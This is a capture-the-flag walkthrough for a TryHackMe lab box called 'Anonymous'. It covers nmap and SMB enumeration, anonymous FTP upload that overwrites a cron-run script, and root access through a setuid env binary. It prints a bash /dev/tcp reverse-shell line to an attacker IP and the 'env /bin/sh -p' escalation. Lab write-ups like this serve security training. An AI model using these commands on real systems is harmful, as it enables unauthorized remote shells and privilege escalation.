# Introduction
This writeup is for my box of Anonymous, submitted on TryHackMe.com.  It is an Easy-ish style box that requires the attacker to gain two flags from the victim's machine.  It requires some basic knowledge of Linux and general privilege escalation methods.  So with that out of the way, let's get started.

# Enumeration
## Port Enumeration
We start by performing the basic enumeration on the box with our trusty tool, nmap.  I like to use the below scan options but you are free to do whatever you'd like.

```bash
nmap -sC -sV -oA nmap/scans {IP_ADDRESS}
```
I'm testing this locally so my IP address is 192.168.196.130.  We run the scan and find **4** ports open.

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-13 12:39 EDT
Nmap scan report for 192.168.196.130
Host is up (0.00059s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 111      113          4096 May 13 15:45 scripts
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.196.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2020-05-13T16:39:58+00:00
| smb-security-mode:                                                                                              
|   account_used: guest                                                                                           
|   authentication_level: user                                                                                    
|   challenge_response: supported                                                                                 
|_  message_signing: disabled (dangerous, but default)                                                            
| smb2-security-mode:                                                                                             
|   2.02:                                                                                                         
|_    Message signing enabled but not required                                                                    
| smb2-time:                                                                                                      
|   date: 2020-05-13T16:39:58                                                                                     
|_  start_date: N/A                                                                                               

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.25 seconds
```
Perfect!  Let's dive into what we see open.

### **FTP (Port 21)**
Looking at the output, we see some interesting things right away: `ftp-anon: Anonymous FTP login allowed (FTP code 230)`.  We'll come back to this in a bit but tuck that away for now.

### **SSH (Port 22)**
We also see that SSH is open but since I wrote this box, I know it's a dead-end.  No user passwords are brute-forceable here.

### **SMB (Ports 139, 445)**
SMB is also open and it's worth digging into.  So let's try enumerating it a little.  We can do this by entering `smbclient -L 192.168.196.130`.  Doing that, we get the following:

```
namelessone@namelessone:~$ smbclient -L 192.168.196.130
Enter WORKGROUP\namelessone's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```
Anonymous login is enabled here so no password necessary.  We also get a glimpse of a user on the system, namelessone (somebody likes to be cryptic!).  We also see 3 shares listed: print$, pics and IPC$.  I don't particularly care about print$ or IPC$, but pics seems interesting.  Let's try to access it.

We can use smbclient to login to the share with the following command: `smbclient \\\\192.168.196.130\\pics`

```
namelessone@namelessone:~$ smbclient \\\\192.168.196.130\\pics
Enter WORKGROUP\namelessone's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
```
Doing so, gets us logged into the share.  From here the user will find 4 jpg files that they are free to download and analyze but there's nothing special here to find.  Attempting to `cd` to a different directory will go nowhere.

# Initial Exploitation (User)
Going back to the other open ports, we see that FTP allows anonymous login.  This is interesting and generally leads to good things.  Let's start with that.

To login to the ftp server we can use the following command: `ftp 192.168.196.130`.  When it prompts for the username, we enter `anonymous` and press <kbd>Enter/Return</kbd>.  It will then prompt for a password.  We can just press <kbd>Enter/Return</kbd> again to be logged in.  The prompt should now look like this:

```
ftp>
```
Performing the normal enumeration of `ls` or `dir`, we see that there's a folder called **scripts**.  Let's go into this with `cd scripts`.  After changing directories, and performing another `ls`, we see that there are 2 or 3 files depending on the time.  We see

```
-rwxr-xrwx    1 0        0             324 May 12 20:33 clean.sh
-rw-r--r--    1 0        0              68 May 12 03:50 to_do.txt
```
And depending on the time, there may be one more file called `removed_files.log`.  If the user downloads this file and `cat`s it, they'll see that it's outputting information every 5 minutes.  At this point, hopefully it is obvious that there is a cronjob running for this user.  The user can also download the `to_do.txt` file and get a hint that the owner of the box needs to disable anonymous login.

From here, we need to somehow get a reverse shell.  The user may try to `put` a test file to see if they can upload.  It should succeed.  Then they may try to overwrite `clean.sh`.  That also works.  So from here we need to generate a payload that will call a reverse shell back to the attacking machine.

The shell that will create a proper TTY shell is the first option using `bash -i >& /dev/tcp/192.168.196.128/1337 0>&1`.  Others may work, but this worked for me right away.  Check out the [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) from Pentest Monkey for help.

This will run and we will be greeted with our user shell prompt:
```
namelessone@anonymous:~$
```
Looking around with `ls` we get the first flag with `user.txt`.  Good job!

# Privilege Escalation (root)
So now the objective is to gain root access.  As our user `namelessone` we can wget our favorite Linux Enumeration script.  I'll be using [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration).  Luckily the author provides an easy `wget` one-liner that will work here.  From the output, we notice the following:

```
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/bin/env
/usr/bin/vim.basic
---
```

Searching [GTFOBins](http://gtfobins.github.io) for `env` gives us the following command to get a shell:
```bash
env /bin/sh
```
This by itself won't work and we need to add a `-p` at the end to give us
```bash
env /bin/sh -p
```
Once we send that command, we are greeted with:
```
env /bin/sh -p
id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
whoami
root
```
Grabbing the `root.txt` file is as easy as `cd /root` and `cat root.txt`.  Box complete!